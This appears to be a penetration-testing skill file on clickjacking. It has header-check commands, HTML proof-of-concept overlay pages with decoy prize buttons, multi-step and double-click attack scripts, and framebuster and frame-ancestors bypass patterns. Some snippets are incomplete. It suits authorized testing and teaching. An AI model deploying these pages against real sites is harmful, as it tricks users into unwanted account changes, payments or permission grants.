---
name: clickjacking
description: Clickjacking testing for X-Frame-Options, CSP frame-ancestors, multi-step and double-clickjacking attacks
---

# Clickjacking

UI redress attacks trick users into clicking on concealed elements, performing unintended actions like changing email/password, authorizing payments, granting permissions, or uploading files. Modern protections can be incomplete, misconfigured, or bypassable.

## Attack Surface

**Targets**
- Account settings pages (email change, password reset, 2FA disable)
- Payment and transfer endpoints, OAuth consent/grant screens
- Admin panels with action buttons, file upload forms

**Frame Embedding Protections**
- `X-Frame-Options` header (DENY, SAMEORIGIN, ALLOW-FROM)
- `Content-Security-Policy: frame-ancestors` directive
- Client-side framebuster scripts, SameSite cookies (indirect)

## Detection

```bash
# Check X-Frame-Options and CSP frame-ancestors
curl -sI https://target.com/sensitive-page | grep -iE 'x-frame-options|content-security-policy|frame-ancestors'

# Sweep multiple endpoints
for path in / /settings /profile /account /admin /transfer /payment; do
  echo "=== $path ==="
  curl -sI "https://target.com$path" | grep -iE 'x-frame-options|content-security-policy|frame-ancestors'
done
```

**Vulnerable Indicators:**
- No X-Frame-Options header at all
- `X-Frame-Options: ALLOW-FROM` with insufficient origin validation (deprecated, not supported by Chrome)
- CSP `frame-ancestors` set to wildcard or attacker-controllable origin
- Protection present on main page but missing on API/action endpoints
- Inconsistent protection between authenticated and unauthenticated states

### X-Frame-Options ALLOW-FROM Bypass

```
# ALLOW-FROM is deprecated and not supported by Chrome
# Partial path validation bypasses:
https://target.com.attacker.com/
https://attackertarget.com/
# Subdomain control (CNAME, subdomain takeover, XSS):
# Frame from: https://sub.target.com/attacker-page.html
```

## Basic Clickjacking PoC

```html
<html>
<head><title>Clickjacking PoC</title></head>
<body>
  <h2>Click to claim your prize!</h2>
  <style>
    #target-frame {
      position: relative; width: 500px; height: 400px;
      opacity: 0.0001; z-index: 2; top: 50px; left: 50px;
    }
    #decoy-button {
      position: absolute; top: 100px; left: 80px; z-index: 1;
      padding: 15px 30px; background: #4CAF50; color: white;
      font-size: 20px; cursor: pointer; border: none; border-radius: 5px;
    }
  </style>
  <div style="position: relative;">
    <div id="decoy-button">🎁 Claim Your Free Prize!</div>
    <iframe id="target-frame" src="https://target.com/settings/email"></iframe>
  </div>
  <script>
    // Adjust top/left offsets empirically to align decoy with target button
    // Use opacity > 0 (not 0) to bypass frame visibility detection JS
  </script>
</body>
</html>
```

## Multi-Step Clickjacking

Attack flows requiring multiple clicks (navigate → confirm → save):

```html
<html>
<body>
<style>
  .step { position: absolute; width: 500px; height: 400px; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; z-index: 1; padding: 15px 30px; background: #2196F3;
           color: white; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; }
</style>
<div style="position: relative;">
  <div class="decoy" id="decoy1" style="top:100px;left:80px;">Start Setup →</div>
  <iframe class="step" id="step1" src="https://target.com/profile" style="top:50px;left:50px;"></iframe>
  <div class="decoy" id="decoy2" style="top:100px;left:80px;display:none;">Continue →</div>
  <iframe class="step" id="step2" src="about:blank" style="top:50px;left:50px;display:none;"></iframe>
</div>
<script>
document.getElementById('step1').addEventListener('load', function() {
  setTimeout(function() {
    document.getElementById('step2').src = 'https://target.com/settings';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('decoy1').style.display = 'none';
    document.getElementById('decoy2').style.display = 'block';
  }, 2000);
});
</script>
</body>
</html>
```

## Double-Clickjacking

Exploits timing gap between mousedown and click events — window repositions between first and second click so the second click lands on the target action:

```html
<html>
<body>
<script>
  let clickCount = 0;
  document.addEventListener('mousedown', function(e) {
    clickCount++;
    if (clickCount === 1) {
      window.moveTo(0, 0); window.resizeTo(800, 600);
      window.open('https://target.com/settings', 'targetWin',
        'width=500,height=400,left=200,top=150');
    }
    if (clickCount === 2) {
      // Second click lands on target action button after repositioning
    }
  });
</script>
<h2>Double-click to download your file</h2>
<button style="padding:20px 40px;font-size:20px;">📥 Download</button>
</body>
</html>
```

## File Upload via Clickjacking

If the upload form lacks CSRF tokens or uses predictable tokens, frame it and align the upload button with a decoy. Pre-select the file via drag-and-drop or File System Access API where available.

## Framebuster Bypass Techniques

**Pattern 1: `top !== self` check**
```
<iframe sandbox="allow-forms allow-scripts" src="https://target.com/page">
# sandbox without allow-top-navigation blocks the framebuster redirect
```

**Pattern 2: `top.location` assignment**
```
# Use onbeforeunload to race the redirect
<iframe src="target.com" onbeforeunload="return false;">
```

**Pattern 3: Double-framing**
```
# If site checks immediate parent only:
Attacker Page → Evil iframe (same-origin proxy) → Target iframe
# Proxy strips framebuster scripts from the response
```

**Sandbox attribute combinations:**
```html
<iframe sandbox="allow-forms allow-scripts" src="..."></iframe>
<iframe sandbox="allow-forms allow-scripts allow-same-origin" src="..."></iframe>
<!-- allow-same-origin needed for cookie-based auth -->
```

## CSP frame-ancestors Bypass

```
frame-ancestors *.target.com     → subdomain takeover
frame-ancestors 'self'           → XSS on same origin
frame-ancestors https:           → any HTTPS site
frame-ancestors *                → completely open
```

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Header analysis, response modification, match-and-replace |
| Custom HTML PoCs | Primary exploitation method |
| OWASP ZAP | Automated header scanning |
| curl/httpie | Quick header verification |

## Verification Checklist

1. [ ] Confirm target action endpoint lacks X-Frame-Options and CSP frame-ancestors
2. [ ] Build positioning PoC with opacity > 0 (some frame-detection JS checks opacity)
3. [ ] Test with sandbox attribute to bypass client-side framebusters
4. [ ] Verify the action succeeds inside iframe (CSRF token present and valid?)
5. [ ] Test multi-step flows if single-click is insufficient
6. [ ] Check if SameSite cookies block the attack
7. [ ] Document click count, positioning offsets, and browser compatibility
